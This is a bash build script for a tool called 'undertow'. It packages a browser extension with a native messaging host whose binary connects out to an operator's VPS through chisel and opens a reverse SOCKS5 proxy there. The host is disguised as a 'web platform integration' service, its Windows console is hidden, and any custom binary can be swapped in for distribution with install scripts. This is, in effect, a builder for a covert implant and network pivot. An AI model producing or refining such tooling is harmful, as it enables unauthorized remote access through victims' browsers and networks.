#!/usr/bin/env bash
set -euo pipefail

TOOL="undertow"
HOST_NAME="com.web.platform"
GECKO_ID="platform@web.local"

TARGET="lin"
ARCH="amd64"
VPS=""
SOCKS_PORT="1080"
SOCKS_BIND="127.0.0.1"
CUSTOM=""
ROTATE_KEY="0"

usage() {
  cat <<EOF
usage: ./build.sh --vps <host:port> [options]

  --target win|lin|mac      target os (default: lin)
  --arch amd64|arm64         target arch (default: amd64)
  --vps <host:port>          chisel server address, baked into the launcher
  --socks-port <port>        reverse socks5 port on the vps (default: 1080)
  --socks-bind <host>        socks listener bind host on the vps
                            (default: 127.0.0.1, use 0.0.0.0 to expose it)
  --custom-binary <path>     package this binary instead of compiling the
                            go host (must accept argv: <vps> [port] [bind])
  --rotate-key               generate a fresh extension id instead of
                            reusing .ext-key.pem
  -h, --help                 show this help
EOF
}

die() { echo "error: $*" >&2; exit 1; }

while [ $# -gt 0 ]; do
  case "$1" in
    --target) TARGET="${2:-}"; shift 2 ;;
    --arch) ARCH="${2:-}"; shift 2 ;;
    --vps) VPS="${2:-}"; shift 2 ;;
    --socks-port) SOCKS_PORT="${2:-}"; shift 2 ;;
    --socks-bind) SOCKS_BIND="${2:-}"; shift 2 ;;
    --custom-binary) CUSTOM="${2:-}"; shift 2 ;;
    --rotate-key) ROTATE_KEY="1"; shift 1 ;;
    -h|--help) usage; exit 0 ;;
    *) die "unknown flag: $1" ;;
  esac
done

[ -n "$VPS" ] || { usage >&2; die "--vps is required"; }
case "$TARGET" in lin|mac|win) ;; *) die "--target must be win, lin or mac" ;; esac
case "$ARCH" in amd64|arm64) ;; *) die "--arch must be amd64 or arm64" ;; esac

case "$TARGET" in
  lin) GOOS="linux"; LAUNCHER="start.sh"; EXE="" ;;
  mac) GOOS="darwin"; LAUNCHER="start.sh"; EXE="" ;;
  win) GOOS="windows"; LAUNCHER="start.bat"; EXE=".exe" ;;
esac

ROOT="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
OUT="$ROOT/dist/$TOOL-$TARGET-$ARCH"
rm -rf "$OUT"
mkdir -p "$OUT/extension"

KEY="$ROOT/.ext-key.pem"
if [ "$ROTATE_KEY" = "1" ] || [ ! -f "$KEY" ]; then
  openssl genrsa -out "$KEY" 2048 2>/dev/null
fi
chmod 600 "$KEY"
DER_B64="$(openssl rsa -in "$KEY" -pubout -outform DER 2>/dev/null | base64 | tr -d '\n')"
EXT_ID="$(openssl rsa -in "$KEY" -pubout -outform DER 2>/dev/null \
  | openssl dgst -sha256 | sed 's/^.*= //' | cut -c1-32 \
  | tr '0123456789abcdef' 'abcdefghijklmnop')"

sed "s|__KEY__|$DER_B64|" "$ROOT/extension/manifest.json" > "$OUT/extension/manifest.json"
cp "$ROOT/extension/background.js" "$OUT/extension/"

ARGS="\"$VPS\" \"$SOCKS_PORT\""
if [ "$SOCKS_BIND" != "127.0.0.1" ]; then
  ARGS="$ARGS \"$SOCKS_BIND\""
fi

if [ "$TARGET" = "win" ]; then
  printf '@echo off\r\n"__DIR__\\host.exe" %s\r\n' "$ARGS" > "$OUT/start.bat"
else
  printf '#!/bin/sh\nexec "__DIR__/host" %s\n' "$ARGS" > "$OUT/start.sh"
  chmod 755 "$OUT/start.sh"
fi

cat > "$OUT/$HOST_NAME.json" <<EOF
{
  "name": "$HOST_NAME",
  "description": "Native messaging host for web platform integration services.",
  "path": "__DIR__/$LAUNCHER",
  "type": "stdio",
  "allowed_origins": ["chrome-extension://$EXT_ID/"],
  "allowed_extensions": ["$GECKO_ID"]
}
EOF

if [ -n "$CUSTOM" ]; then
  [ -f "$CUSTOM" ] || die "--custom-binary not found: $CUSTOM"
  cp "$CUSTOM" "$OUT/host$EXE"
else
  LDFLAGS="-s -w"
  if [ "$TARGET" = "win" ]; then
    LDFLAGS="$LDFLAGS -H windowsgui"
  fi
  (cd "$ROOT/host" \
    && CGO_ENABLED=0 GOOS="$GOOS" GOARCH="$ARCH" \
       go build -trimpath -ldflags "$LDFLAGS" -o "$OUT/host$EXE" .)
fi
[ -f "$OUT/host$EXE" ] || die "host build failed"
chmod 755 "$OUT/host$EXE"

cp "$ROOT/host/install.sh" "$OUT/"
cp "$ROOT/host/install.ps1" "$OUT/"

(cd "$ROOT/dist" && zip -rq "$TOOL-$TARGET-$ARCH.zip" "$TOOL-$TARGET-$ARCH")

echo "vps:             $VPS"
echo "socks5 on vps:   127.0.0.1:$SOCKS_PORT (bind: $SOCKS_BIND)"
echo "chrome ext id:  $EXT_ID"
echo "key file:        $KEY$([ "$ROTATE_KEY" = "1" ] && echo " (rotated)")"
echo "firefox ext id: $GECKO_ID"
echo "output:          $OUT"
echo "zip:             $ROOT/dist/$TOOL-$TARGET-$ARCH.zip"
